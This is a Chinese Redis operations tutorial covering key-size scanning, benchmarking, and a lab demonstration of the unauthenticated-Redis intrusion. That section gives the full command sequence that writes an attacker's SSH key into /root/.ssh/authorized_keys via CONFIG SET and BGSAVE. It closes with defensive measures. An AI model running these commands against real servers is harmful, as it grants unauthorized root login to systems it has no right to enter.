# 09-redis实战技巧

# 1.分析key大小

```
[root@db-51 ~]#redis-cli -h 10.0.0.51 -p 6380  --bigkeys

# Scanning the entire keyspace to find biggest keys as well as
# average sizes per key type.  You can use -i 0.1 to sleep 0.1 sec
# per 100 SCAN commands (not usually needed).


-------- summary -------

Sampled 0 keys in the keyspace!
Total key length in bytes is 0 (avg len 0.00)


0 hashs with 0 fields (00.00% of keys, avg size 0.00)
0 lists with 0 items (00.00% of keys, avg size 0.00)
0 strings with 0 bytes (00.00% of keys, avg size 0.00)
0 streams with 0 entries (00.00% of keys, avg size 0.00)
0 sets with 0 members (00.00% of keys, avg size 0.00)
0 zsets with 0 members (00.00% of keys, avg size 0.00)



=====================================================================


[root@db-51 ~]#
[root@db-51 ~]#redis-cli -h 10.0.0.51 -p 6380  --memkeys

# Scanning the entire keyspace to find biggest keys as well as
# average sizes per key type.  You can use -i 0.1 to sleep 0.1 sec
# per 100 SCAN commands (not usually needed).


-------- summary -------

Sampled 0 keys in the keyspace!
Total key length in bytes is 0 (avg len 0.00)


0 hashs with 0 bytes (00.00% of keys, avg size 0.00)
0 lists with 0 bytes (00.00% of keys, avg size 0.00)
0 strings with 0 bytes (00.00% of keys, avg size 0.00)
0 streams with 0 bytes (00.00% of keys, avg size 0.00)
0 sets with 0 bytes (00.00% of keys, avg size 0.00)
0 zsets with 0 bytes (00.00% of keys, avg size 0.00)
```

# 2.性能测试

```
[root@db-51 ~]#redis-benchmark -h 10.0.0.51 -p 6380 -n 10000 -q
PING_INLINE: 142857.14 requests per second
PING_BULK: 172413.80 requests per second
SET: 169491.53 requests per second
GET: 166666.67 requests per second
INCR: 169491.53 requests per second
LPUSH: 163934.42 requests per second
RPUSH: 172413.80 requests per second
LPOP: 169491.53 requests per second
RPOP: 175438.59 requests per second
SADD: 166666.67 requests per second
HSET: 175438.59 requests per second
SPOP: 169491.53 requests per second
LPUSH (needed to benchmark LRANGE): 158730.16 requests per second
LRANGE_100 (first 100 elements): 103092.78 requests per second
LRANGE_300 (first 300 elements): 46511.63 requests per second
LRANGE_500 (first 450 elements): 37735.85 requests per second
LRANGE_600 (first 600 elements): 29940.12 requests per second
MSET (10 keys): 178571.42 requests per second
```

# 3.redis入侵攻击

## 前提环境（也是你防御手段）

```
1. redis 用root运行
2. redis允许远程登录
3. redis没有密码，或者太简单密码
```

## 入侵原理

```
# author: www.yuchaoit.cn
1. 本质利用redis的热更新配置，动态设置数据持久化策略
2. 利用redis远程访问功能，将攻击者的ssh公钥当做key写入redis
3.动态修改redis配置，将持久化目录改为/root/.ssh/
4.动态修改配置，将持久化文件名改为authorized_keys
5.执行持久化命令，这样就会生成/root/.ssh/authorized_keys文件
6.因此通过这个方案，恶意实现可以免密登录。
```

## 实战

准备一个新redis测试即可

```
[root@db-51 ~]#ps -ef|grep redis
root       3569      1  0 01:12 ?        00:00:00 redis-server 0.0.0.0:6379
root       3577   3049  0 01:13 pts/0    00:00:00 grep --color=auto redis

一个典型的 危险redis

测试 53 > 攻击51
1.客户端秘钥生成
ssh-keygen

2.秘钥保存为文件
(echo -e "\n";cat /root/.ssh/id_rsa.pub;echo -e "\n")>ssh_key

cat ssh_key 


ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDD0Tq/GrODJSzUvGshrc+Ostms9pnNrCT/mhMI88tk8dVGGoTWDORXEe/Ou7VpRry9bPizPrk12NHa/hrUDVOQsjDgtQxtOUsJ7uG9kxV1ndUZMz6g9R/S+DRrPDDbHpcv9YcTeyp8SrVKZt3dj4liO/ZKyE9FfY9ZlDDT3C4dHzIna/qquns7jhvaEGAUcdWv1LtB7+GDPycV2Hj0I7AUIc67bsKtyW06kNoLAmAx7X9Q9XIViXRNjLowNitgryeiVGU7zo+sjhiWHHehg4MuabsehrLV3fD/nenMg0HLfl5bWSdkP7pXbge6vLOWThaMDjBoRkRxu0NLqjXahc9P root@db-51


3.秘钥写入redis
cat ssh_key | redis-cli -h 10.0.0.51  -x set ssh_key


4.动态修改redis信息


redis-cli -h 10.0.0.51  config get dir
redis-cli -h 10.0.0.51  config set dir /root/.ssh
redis-cli -h 10.0.0.51  config set dbfilename authorized_keys
redis-cli -h 10.0.0.51 bgsave


5.查看被攻击的服务器
[root@db-51 ~]#cat ~/.ssh/authorized_keys 
REDIS0009    redis-ver5.0.7
redis-bits󿿀򳨭used-mem 
𮤭preamble~𲲨_keyA 

ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCzJpOcTOtHKgkCxL9rN5DWdO72ztU2atrg+jslCuDkQ0R1mEhY+VCEj6+kikaCB3xYRSEcxDVHSpIU/fHgOu47S5R54ui5ioQc+BI6yLN33sgeUSL4RziDjNx8+9FhAmWyNWX8y7FMfai2W+Q5V9qNba8NqZG0Iyz42AZ60ii1QqTlwQh6c1aiAwy/JcHpxTXVCOErXRfBIM26GT73Rc0dJf86j0XUdZAPbTCgMVIyflynBnIRgRfQXv/MDY//5z1DCg/SyR802DCPAeWzcPOVIwIdSXJU1t6GpXgLO1CRdvUpQT/9SYjCegdIu94mYV4iU01iIfaa15h//0gIWB75 root@db-53

这家伙，那这个黑客的db-53机器，不就可以免密登录了吗？

6.黑客来了！
```

![image-20220812172219263](http://book.bikongge.com/sre/2024-linux/image-20220812172219263.png)

## 如何防范

```
攻击亦是防御

1. 普通用户运行redis，这样无法操作/root了，但是还是很危险，只要对方能进入你服务器
2. 设置复杂的redis认证密码
3. 修改监听的端口，监听内网地址
4.禁止线上的config动态修改配置的命令
5.做好服务器监控工作，与数据备份
```